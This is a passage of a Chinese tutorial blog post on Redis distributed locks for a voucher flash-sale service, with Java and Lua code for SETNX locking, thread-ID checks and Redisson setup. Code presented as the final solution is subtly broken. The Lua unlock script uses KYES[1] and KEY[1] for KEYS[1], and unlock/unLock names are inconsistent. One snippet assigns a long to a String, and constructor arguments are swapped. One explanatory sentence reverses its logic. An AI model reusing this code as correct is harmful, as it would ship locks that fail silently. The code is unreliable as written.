<span class="hljs-keyword">public</span>  Result <span class="hljs-title function_">createVoucherOrder</span><span class="hljs-params">(Long voucherId)</span> &#123;
	<span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();
	<span class="hljs-keyword">synchronized</span>(userId.toString().intern())&#123;
         <span class="hljs-comment">// 5.1.查询订单</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> query().eq(<span class="hljs-string">&quot;user_id&quot;</span>, userId).eq(<span class="hljs-string">&quot;voucher_id&quot;</span>, voucherId).count();
        <span class="hljs-comment">// 5.2.判断是否存在</span>
        <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;
            <span class="hljs-comment">// 用户已经购买过了</span>
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;用户已经购买过一次！&quot;</span>);
        &#125;
        <span class="hljs-comment">// 6.扣减库存</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> seckillVoucherService.update()
                .setSql(<span class="hljs-string">&quot;stock = stock - 1&quot;</span>) <span class="hljs-comment">// set stock = stock - 1</span>
                .eq(<span class="hljs-string">&quot;voucher_id&quot;</span>, voucherId).gt(<span class="hljs-string">&quot;stock&quot;</span>, <span class="hljs-number">0</span>) <span class="hljs-comment">// where id = ? and stock &gt; 0</span>
                .update();
        <span class="hljs-keyword">if</span> (!success) &#123;
            <span class="hljs-comment">// 扣减失败</span>
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;库存不足！&quot;</span>);
        &#125;
        <span class="hljs-comment">// 7.创建订单</span>
        <span class="hljs-type">VoucherOrder</span> <span class="hljs-variable">voucherOrder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VoucherOrder</span>();
        <span class="hljs-comment">// 7.1.订单id</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> redisIdWorker.nextId(<span class="hljs-string">&quot;order&quot;</span>);
        voucherOrder.setId(orderId);
        <span class="hljs-comment">// 7.2.用户id</span>
        voucherOrder.setUserId(userId);
        <span class="hljs-comment">// 7.3.代金券id</span>
        voucherOrder.setVoucherId(voucherId);
        save(voucherOrder);
        <span class="hljs-comment">// 7.返回订单id</span>
        <span class="hljs-keyword">return</span> Result.ok(orderId);
    &#125;
&#125;</code></pre>



<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>分布式锁：满足分布式系统或集群模式下多进程可见并且互斥的锁。</p>
<p>分布式锁的核心思想就是让大家都使用同一把锁，只要大家使用的是同一把锁，那么我们就能锁住线程，不让线程进行，让程序串行执行，这就是分布式锁的核心思路</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/1653374296906.png"></p>
<p>那么分布式锁他应该满足一些什么样的条件呢？</p>
<p>可见性：多个线程都能看到相同的结果，注意：这个地方说的可见性并不是并发编程中指的内存可见性，只是说多个进程之间都能感知到变化的意思</p>
<p>互斥：互斥是分布式锁的最基本的条件，使得程序串行执行</p>
<p>高可用：程序不易崩溃，时时刻刻都保证较高的可用性</p>
<p>高性能：由于加锁本身就让性能降低，所有对于分布式锁本身需要他就较高的加锁性能和释放锁性能</p>
<p>安全性：安全也是程序中必不可少的一环</p>
<p>Redis：redis作为分布式锁是非常常见的一种使用方式，现在企业级开发中基本都使用redis或者zookeeper作为分布式锁，利用setnx这个方法，如果插入key成功，则表示获得到了锁，如果有人插入成功，其他人插入失败则表示无法获得到锁，利用这套逻辑来实现分布式锁</p>
<h2 id="Redis分布式锁的实现核心思路"><a href="#Redis分布式锁的实现核心思路" class="headerlink" title="Redis分布式锁的实现核心思路"></a>Redis分布式锁的实现核心思路</h2><p>实现分布式锁时需要实现的两个基本方法：</p>
<ul>
<li><p>获取锁：</p>
<ul>
<li>互斥：确保只能有一个线程获取锁</li>
<li>非阻塞：尝试一次，成功返回true，失败返回false</li>
</ul>
</li>
<li><p>释放锁：</p>
<ul>
<li>手动释放</li>
<li>超时释放：获取锁时添加一个超时时间</li>
</ul>
<pre><code class="hljs css"><span class="hljs-selector-tag">DEL</span> key</code></pre></li>
</ul>
<p>核心思路：</p>
<p>利用redis 的setNx 方法，当有多个线程进入时，我们就利用该方法，第一个线程进入时，redis 中就有这个key 了，返回了1，如果结果是1，则表示他抢到了锁，那么他去执行业务，然后再删除锁，退出锁逻辑，没有抢到锁的哥们，等待一定时间后重试即可</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106121053252.png" alt="image-20230106121053252"></p>
<h2 id="实现分布式锁"><a href="#实现分布式锁" class="headerlink" title="实现分布式锁"></a>实现分布式锁</h2><p>锁的基本接口</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hmdp.utils;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ILock</span> &#123;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 尝试获取锁</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> timeOutSec</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeOutSec)</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 释放锁</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">unLock</span><span class="hljs-params">()</span>;
&#125;
</code></pre>

<p><strong>SimpleRedisLock</strong></p>
<p>利用setnx方法进行加锁，同时增加过期时间，防止死锁，此方法可以保证加锁和增加过期时间具有原子性</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String KEY_PREFIX=<span class="hljs-string">&quot;lock:&quot;</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeoutSec)</span> &#123;
    <span class="hljs-comment">// 获取线程标示</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> Thread.currentThread().getId()
    <span class="hljs-comment">// 获取锁</span>
    <span class="hljs-type">Boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> stringRedisTemplate.opsForValue()
            .setIfAbsent(KEY_PREFIX + name, threadId + <span class="hljs-string">&quot;&quot;</span>, timeoutSec, TimeUnit.SECONDS);
    <span class="hljs-keyword">return</span> Boolean.TRUE.equals(success);
&#125;</code></pre>

<ul>
<li>释放锁逻辑</li>
</ul>
<p>SimpleRedisLock</p>
<p>释放锁，防止删除别人的锁</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-comment">//通过del删除锁</span>
    stringRedisTemplate.delete(KEY_PREFIX + name);
&#125;</code></pre>

<ul>
<li>修改业务代码</li>
</ul>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
  <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">seckillVoucher</span><span class="hljs-params">(Long voucherId)</span> &#123;
      <span class="hljs-comment">// 1.查询优惠券</span>
      <span class="hljs-type">SeckillVoucher</span> <span class="hljs-variable">voucher</span> <span class="hljs-operator">=</span> seckillVoucherService.getById(voucherId);
      <span class="hljs-comment">// 2.判断秒杀是否开始</span>
      <span class="hljs-keyword">if</span> (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;
          <span class="hljs-comment">// 尚未开始</span>
          <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;秒杀尚未开始！&quot;</span>);
      &#125;
      <span class="hljs-comment">// 3.判断秒杀是否已经结束</span>
      <span class="hljs-keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;
          <span class="hljs-comment">// 尚未开始</span>
          <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;秒杀已经结束！&quot;</span>);
      &#125;
      <span class="hljs-comment">// 4.判断库存是否充足</span>
      <span class="hljs-keyword">if</span> (voucher.getStock() &lt; <span class="hljs-number">1</span>) &#123;
          <span class="hljs-comment">// 库存不足</span>
          <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;库存不足！&quot;</span>);
      &#125;
      <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();
      <span class="hljs-comment">//创建锁对象(新增代码)</span>
      <span class="hljs-type">SimpleRedisLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleRedisLock</span>(<span class="hljs-string">&quot;order:&quot;</span> + userId, stringRedisTemplate);
      <span class="hljs-comment">//获取锁对象</span>
      <span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> lock.tryLock(<span class="hljs-number">1200</span>);
<span class="hljs-comment">//加锁失败</span>
      <span class="hljs-keyword">if</span> (!isLock) &#123;
          <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;不允许重复下单&quot;</span>);
      &#125;
      <span class="hljs-keyword">try</span> &#123;
          <span class="hljs-comment">//获取代理对象(事务)</span>
          <span class="hljs-type">IVoucherOrderService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (IVoucherOrderService) AopContext.currentProxy();
          <span class="hljs-keyword">return</span> proxy.createVoucherOrder(voucherId);
      &#125; <span class="hljs-keyword">finally</span> &#123;
          <span class="hljs-comment">//释放锁</span>
          lock.unlock();
      &#125;
  &#125;</code></pre>

<h3 id="Redis分布式锁误删操作情况说明"><a href="#Redis分布式锁误删操作情况说明" class="headerlink" title="Redis分布式锁误删操作情况说明"></a>Redis分布式锁误删操作情况说明</h3><p>逻辑说明：</p>
<p>持有锁的线程在锁的内部出现了阻塞，导致他的锁自动释放，这时其他线程，线程2来尝试获得锁，就拿到了这把锁，然后线程2在持有锁执行过程中，线程1反应过来，继续执行，而线程1执行过程中，走到了删除锁逻辑，此时就会把本应该属于线程2的锁进行删除，这就是误删别人锁的情况说明</p>
<p>解决方案：解决方案就是在每个线程释放锁的时候，去判断一下当前这把锁是否属于自己，如果属于自己，则不进行锁的删除，假设还是上边的情况，线程1卡顿，锁自动释放，线程2进入到锁的内部执行逻辑，此时线程1反应过来，然后删除锁，但是线程1，一看当前这把锁不是属于自己，于是不进行删除锁逻辑，当线程2走到删除锁逻辑时，如果没有卡过自动释放锁的时间点，则判断当前这把锁是属于自己的，于是删除这把锁。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106165047051.png" alt="image-20230106165047051"></p>
<h3 id="解决Redis分布式锁误删问题"><a href="#解决Redis分布式锁误删问题" class="headerlink" title="解决Redis分布式锁误删问题"></a>解决Redis分布式锁误删问题</h3><p>需求：修改之前的分布式锁实现，满足：在获取锁时存入线程标示（可以用UUID表示）<br>在释放锁时先获取锁中的线程标示，判断是否与当前线程标示一致</p>
<ul>
<li>如果一致则释放锁</li>
<li>如果不一致则不释放锁</li>
</ul>
<p>核心逻辑：在存入锁时，放入自己线程的标识，在删除锁时，判断当前这把锁的标识是不是自己存入的，如果是，则进行删除，如果不是，则不进行删除。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106165159764.png" alt="image-20230106165159764"></p>
<p>具体代码如下：加锁</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ID_PREFIX</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString(<span class="hljs-literal">true</span>) + <span class="hljs-string">&quot;-&quot;</span>;
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeoutSec)</span> &#123;
   <span class="hljs-comment">// 获取线程标示</span>
   <span class="hljs-type">String</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> ID_PREFIX + Thread.currentThread().getId();
   <span class="hljs-comment">// 获取锁</span>
   <span class="hljs-type">Boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> stringRedisTemplate.opsForValue()
                .setIfAbsent(KEY_PREFIX + name, threadId, timeoutSec, TimeUnit.SECONDS);
   <span class="hljs-keyword">return</span> Boolean.TRUE.equals(success);
&#125;</code></pre>

<p>释放锁</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-comment">// 获取线程标示</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> ID_PREFIX + Thread.currentThread().getId();
    <span class="hljs-comment">// 获取锁中的标示</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> stringRedisTemplate.opsForValue().get(KEY_PREFIX + name);
    <span class="hljs-comment">// 判断标示是否一致</span>
    <span class="hljs-keyword">if</span>(threadId.equals(id)) &#123;
        <span class="hljs-comment">// 释放锁</span>
        stringRedisTemplate.delete(KEY_PREFIX + name);
    &#125;
&#125;</code></pre>

<p><strong>有关代码实操说明：</strong></p>
<p>在我们修改完此处代码后，我们重启工程，然后启动两个线程，第一个线程持有锁后，手动释放锁，第二个线程 此时进入到锁内部，再放行第一个线程，此时第一个线程由于锁的value值并非是自己，所以不能释放锁，也就无法删除别人的锁，此时第二个线程能够正确释放锁，通过这个案例初步说明我们解决了锁误删的问题。</p>
<h3 id="分布式锁的原子性问题"><a href="#分布式锁的原子性问题" class="headerlink" title="分布式锁的原子性问题"></a>分布式锁的原子性问题</h3><p>更为极端的误删逻辑说明：</p>
<p>线程1现在持有锁之后，在执行业务逻辑过程中，他正准备删除锁，而且已经走到了条件判断的过程中，比如他已经拿到了当前这把锁确实是属于他自己的，正准备删除锁，但是此时他的锁到期了，那么此时线程2进来，但是线程1他会接着往后执行，当他卡顿结束后，他直接就会执行删除锁那行代码，相当于条件判断并没有起到作用，这就是删锁时的原子性问题，之所以有这个问题，是因为线程1的拿锁，比锁，删锁，实际上并不是原子性的，我们要防止刚才的情况发生，</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106165442367.png" alt="image-20230106165442367"></p>
<h3 id="利用Java代码调用Lua脚本改造分布式锁"><a href="#利用Java代码调用Lua脚本改造分布式锁" class="headerlink" title="利用Java代码调用Lua脚本改造分布式锁"></a>利用Java代码调用Lua脚本改造分布式锁</h3><p>lua脚本本身并不需要大家花费太多时间去研究，只需要知道如何调用，大致是什么意思即可，所以在笔记中并不会详细的去解释这些lua表达式的含义。</p>
<p>我们的RedisTemplate中，可以利用execute方法去执行lua脚本，参数对应关系就如下图</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230106165522921.png" alt="image-20230106165522921"></p>
<p><strong>lua脚本代码</strong></p>
<pre><code class="hljs lua"><span class="hljs-comment">--比较线程标识与锁中的标示是否一样</span>
<span class="hljs-keyword">if</span>(redis.call(<span class="hljs-string">&#x27;get&#x27;</span>,KYES[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>]) <span class="hljs-keyword">then</span>
    <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">&#x27;del&#x27;</span>, KEY[<span class="hljs-number">1</span>])
<span class="hljs-keyword">end</span>
<span class="hljs-keyword">return</span> <span class="hljs-number">0</span></code></pre>

<p><strong>Java代码</strong></p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> DefaultRedisScript&lt;Long&gt; UNLOCK_SCRIPT;
    <span class="hljs-keyword">static</span> &#123;
        UNLOCK_SCRIPT = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;();
        UNLOCK_SCRIPT.setLocation(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathResource</span>(<span class="hljs-string">&quot;unlock.lua&quot;</span>));
        UNLOCK_SCRIPT.setResultType(Long.class);
    &#125;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-comment">// 调用lua脚本</span>
    stringRedisTemplate.execute(
            UNLOCK_SCRIPT,
            Collections.singletonList(KEY_PREFIX + name),
            ID_PREFIX + Thread.currentThread().getId());
&#125;
经过以上代码改造后，我们就能够实现 拿锁比锁删锁的原子性动作了~</code></pre>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实现思路</p>
<ul>
<li>利用set nx ex 获取锁，并设置过期时间，保存线程标示</li>
<li>释放锁时先判断线程标示是否一致，一致时再删除锁，防止误删操作</li>
</ul>
<p>特性：</p>
<ul>
<li>利用setnx满足互斥性</li>
<li>利用set ex保证故障时锁依然能释放，避免死锁，提高安全性利</li>
<li>用Redis集群保证高可用和高并发特性</li>
</ul>
<p>实现过程中涉及到的所有代码如下</p>
<p><strong>unlaock.lua</strong></p>
<pre><code class="hljs lua"><span class="hljs-comment">--比较线程标识与锁中的标示是否一样</span>
<span class="hljs-keyword">if</span>(redis.call(<span class="hljs-string">&#x27;get&#x27;</span>,KYES[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>]) <span class="hljs-keyword">then</span>
    <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">&#x27;del&#x27;</span>, KEY[<span class="hljs-number">1</span>])
<span class="hljs-keyword">end</span>
<span class="hljs-keyword">return</span> <span class="hljs-number">0</span></code></pre>

<p><strong>ILock.java</strong></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hmdp.utils;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ILock</span> &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 尝试获取锁</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> timeOutSec</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeOutSec)</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 释放锁</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">unLock</span><span class="hljs-params">()</span>;
&#125;
</code></pre>

<p>SimpleRedisLock.java 为ILock的实现类</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hmdp.utils;

<span class="hljs-keyword">import</span> cn.hutool.core.lang.UUID;
<span class="hljs-keyword">import</span> org.springframework.core.io.ClassPathResource;
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.script.DefaultRedisScript;

<span class="hljs-keyword">import</span> java.time.Duration;

<span class="hljs-keyword">import</span> java.util.Collections;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleRedisLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ILock</span>&#123;

    <span class="hljs-keyword">private</span> StringRedisTemplate stringRedisTemplate;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;lock:&quot;</span>;
    <span class="hljs-comment">// 使用UUID生成线程标示，防止出现重复的线程id 避免出现误删锁的操作</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ID_PREFIX</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString(<span class="hljs-literal">true</span>) + <span class="hljs-string">&quot;-&quot;</span>;

    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-comment">// 因为不是spring管理的bean所以需要构造函数来初始化stringRedisTemplate和name</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SimpleRedisLock</span><span class="hljs-params">(StringRedisTemplate stringRedisTemplate, String name)</span> &#123;
        <span class="hljs-built_in">this</span>.stringRedisTemplate = stringRedisTemplate;
        <span class="hljs-built_in">this</span>.name = name;
    &#125;



    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeOutSec)</span> &#123;
        <span class="hljs-type">String</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> ID_PREFIX + Thread.currentThread().getId();
        <span class="hljs-comment">// 获取锁操作 在redis中setnx</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> stringRedisTemplate.opsForValue().setIfAbsent(KEY_PREFIX + <span class="hljs-built_in">this</span>.name, threadId, timeOutSec, TimeUnit.SECONDS);
        <span class="hljs-comment">// 防止拆箱和装箱过程中出现空指针错误</span>
        <span class="hljs-keyword">return</span> Boolean.TRUE.equals(success);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> DefaultRedisScript&lt;Long&gt; UNLOCK_STRIPT;
    <span class="hljs-comment">// 初始化lua脚本</span>
    <span class="hljs-comment">// 使用静态代码块的执行效率更高，因为静态代码块在类加载时执行一次</span>
    <span class="hljs-keyword">static</span> &#123;
        UNLOCK_STRIPT = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;();
        UNLOCK_STRIPT.setLocation(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathResource</span>(<span class="hljs-string">&quot;unlock.lua&quot;</span>));
        UNLOCK_STRIPT.setResultType(Long.class);
    &#125;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unLock</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-comment">// 该函数接收三个参数：脚本(RedisScript)、keys、args</span>
        stringRedisTemplate.execute(
                UNLOCK_STRIPT,
                Collections.singletonList(KEY_PREFIX + name),
                ID_PREFIX + Thread.currentThread().getId()
                );
    &#125;
<span class="hljs-comment">// 此方法实现中存在缺陷 不具有原子性，可能出现bug</span>
<span class="hljs-comment">//    @Override</span>
<span class="hljs-comment">//    public void unLock() &#123;</span>
<span class="hljs-comment">//        String threadId = ID_PREFIX + Thread.currentThread().getId();</span>
<span class="hljs-comment">//        String id = stringRedisTemplate.opsForValue().get(KEY_PREFIX + name);</span>
<span class="hljs-comment">//        if(threadId.equals(id))&#123;</span>
<span class="hljs-comment">//            stringRedisTemplate.delete(KEY_PREFIX + name);</span>
<span class="hljs-comment">//        &#125;</span>
<span class="hljs-comment">//    &#125;</span>
&#125;
</code></pre>

<p>创建订单的函数</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> Result <span class="hljs-title function_">seckillVoucher</span><span class="hljs-params">(Long voucherId)</span> &#123;
    <span class="hljs-comment">// 1.查询优惠券</span>
    <span class="hljs-type">SeckillVoucher</span> <span class="hljs-variable">voucher</span> <span class="hljs-operator">=</span> seckillVoucherService.getById(voucherId);
    <span class="hljs-comment">// 2.判断秒杀是否开始</span>
    <span class="hljs-keyword">if</span> (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;
        <span class="hljs-comment">// 尚未开始</span>
        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;秒杀尚未开始！&quot;</span>);
    &#125;
    <span class="hljs-comment">// 3.判断秒杀是否已经结束</span>
    <span class="hljs-keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;
        <span class="hljs-comment">// 尚未开始</span>
        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;秒杀已经结束！&quot;</span>);
    &#125;
    <span class="hljs-comment">// 4.判断库存是否充足</span>
    <span class="hljs-keyword">if</span> (voucher.getStock() &lt; <span class="hljs-number">1</span>) &#123;
        <span class="hljs-comment">// 库存不足</span>
        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;库存不足！&quot;</span>);
    &#125;
    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();
    <span class="hljs-comment">//创建锁对象(新增代码)</span>
    <span class="hljs-type">SimpleRedisLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleRedisLock</span>(<span class="hljs-string">&quot;order:&quot;</span> + userId, stringRedisTemplate);
    <span class="hljs-comment">//获取锁对象</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> lock.tryLock(<span class="hljs-number">1200</span>);
    <span class="hljs-comment">//加锁失败</span>
    <span class="hljs-keyword">if</span> (!isLock) &#123;
        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;不允许重复下单&quot;</span>);
    &#125;
    <span class="hljs-keyword">try</span> &#123;
        <span class="hljs-comment">//获取代理对象(事务)</span>
        <span class="hljs-type">IVoucherOrderService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (IVoucherOrderService) AopContext.currentProxy();
        <span class="hljs-keyword">return</span> proxy.createVoucherOrder(voucherId);
    &#125; <span class="hljs-keyword">finally</span> &#123;
        <span class="hljs-comment">//释放锁</span>
        lock.unlock();
    &#125;
&#125;</code></pre>



<h1 id="Redisson实现分布式锁"><a href="#Redisson实现分布式锁" class="headerlink" title="Redisson实现分布式锁"></a>Redisson实现分布式锁</h1><p>Redisson是一个在Redis的基础上实现的Java驻内存数据网格（In-Memory Data Grid）。它不仅提供了一系列的分布式的Java常用对象，还提供了许多分布式服务，其中就包含了各种分布式锁的实现。</p>
<h2 id="Redisson入门"><a href="#Redisson入门" class="headerlink" title="Redisson入门"></a>Redisson入门</h2><p>引入依赖：</p>
<pre><code class="hljs java">&lt;dependency&gt;
	&lt;groupId&gt;org.redisson&lt;/groupId&gt;
	&lt;artifactId&gt;redisson&lt;/artifactId&gt;
	&lt;version&gt;<span class="hljs-number">3.13</span><span class="hljs-number">.6</span>&lt;/version&gt;
&lt;/dependency&gt;</code></pre>

<p>配置Redisson客户端：</p>
<pre><code class="hljs java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedissonConfig</span> &#123;

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedissonClient <span class="hljs-title function_">redissonClient</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-comment">// 配置</span>
        <span class="hljs-type">Config</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();
        config.useSingleServer().setAddress(<span class="hljs-string">&quot;redis://192.168.150.101:6379&quot;</span>)
            .setPassword(<span class="hljs-string">&quot;123321&quot;</span>);
        <span class="hljs-comment">// 创建RedissonClient对象</span>
        <span class="hljs-keyword">return</span> Redisson.create(config);
    &#125;
&#125;
</code></pre>

<p>如何使用Redission的分布式锁</p>
<pre><code class="hljs java"><span class="hljs-meta">@Resource</span>
<span class="hljs-keyword">private</span> RedissionClient redissonClient;

<span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testRedisson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;
    <span class="hljs-comment">//获取锁(可重入)，指定锁的名称</span>
    <span class="hljs-type">RLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> redissonClient.getLock(<span class="hljs-string">&quot;anyLock&quot;</span>);
    <span class="hljs-comment">//尝试获取锁，参数分别是：获取锁的最大等待时间(期间会重试)，锁自动释放时间，时间单位</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> lock.tryLock(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,TimeUnit.SECONDS);
    <span class="hljs-comment">//判断获取锁成功</span>
    <span class="hljs-keyword">if</span>(isLock)&#123;
        <span class="hljs-keyword">try</span>&#123;
            System.out.println(<span class="hljs-string">&quot;执行业务&quot;</span>);          
        &#125;<span class="hljs-keyword">finally</span>&#123;
            <span class="hljs-comment">//释放锁</span>
            lock.unlock();
        &#125;
        
    &#125;  
&#125;</code></pre>

<h2 id="Redisson使用"><a href="#Redisson使用" class="headerlink" title="Redisson使用"></a>Redisson使用</h2><p>在 VoucherOrderServiceImpl</p>
<p>注入RedissonClient</p>
<pre><code class="hljs java"><span class="hljs-meta">@Resource</span>
<span class="hljs-keyword">private</span> RedissonClient redissonClient;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> Result <span class="hljs-title function_">seckillVoucher</span><span class="hljs-params">(Long voucherId)</span> &#123;
        <span class="hljs-comment">// 1.查询优惠券</span>
